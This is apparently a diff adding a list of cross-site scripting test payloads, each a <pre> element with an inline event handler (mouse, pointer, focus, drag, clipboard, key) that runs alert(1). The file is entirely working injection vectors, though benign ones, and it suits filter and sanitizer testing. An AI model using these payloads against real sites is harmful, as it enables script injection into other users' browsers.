@@ -1,0 +1,43 @@
+<pre draggable="true" ondrag="alert(1)">test</pre>
+<pre draggable="true" ondragend="alert(1)">test</pre>
+<pre draggable="true" ondragenter="alert(1)">test</pre>
+<pre draggable="true" ondragleave="alert(1)">test</pre>
+<pre draggable="true" ondragstart="alert(1)">test</pre>
+<pre id=x tabindex=1 onactivate=alert(1)></pre>
+<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>
+<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>
+<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>
+<pre id=x tabindex=1 onfocus=alert(1)></pre>
+<pre id=x tabindex=1 onfocusin=alert(1)></pre>
+<pre onafterscriptexecute=alert(1)><script>1</script>
+<pre onbeforecopy="alert(1)" contenteditable>test</pre>
+<pre onbeforecut="alert(1)" contenteditable>test</pre>
+<pre onbeforepaste="alert(1)" contenteditable>test</pre>
+<pre onbeforescriptexecute=alert(1)><script>1</script>
+<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>
+<pre onclick="alert(1)">test</pre>
+<pre oncontextmenu="alert(1)">test</pre>
+<pre oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<pre oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<pre ondblclick="alert(1)" autofocus tabindex=1>test</pre>
+<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
+<pre onkeydown="alert(1)" contenteditable>test</pre>
+<pre onkeypress="alert(1)" contenteditable>test</pre>
+<pre onkeyup="alert(1)" contenteditable>test</pre>
+<pre onmousedown="alert(1)">test</pre>
+<pre onmouseenter="alert(1)">test</pre>
+<pre onmouseleave="alert(1)">test</pre>
+<pre onmousemove="alert(1)">test</pre>
+<pre onmouseout="alert(1)">test</pre>
+<pre onmouseover="alert(1)">test</pre>
+<pre onmouseup="alert(1)">test</pre>
+<pre onmousewheel=alert(1)>requires scrolling
+<pre onpaste="alert(1)" contenteditable>test</pre>
+<pre onpointerdown=alert(1)>XSS</pre>
+<pre onpointerenter=alert(1)>XSS</pre>
+<pre onpointerleave=alert(1)>XSS</pre>
+<pre onpointermove=alert(1)>XSS</pre>
+<pre onpointerout=alert(1)>XSS</pre>
+<pre onpointerover=alert(1)>XSS</pre>
+<pre onpointerrawupdate=alert(1)>XSS</pre>
+<pre onpointerup=alert(1)>XSS</pre>
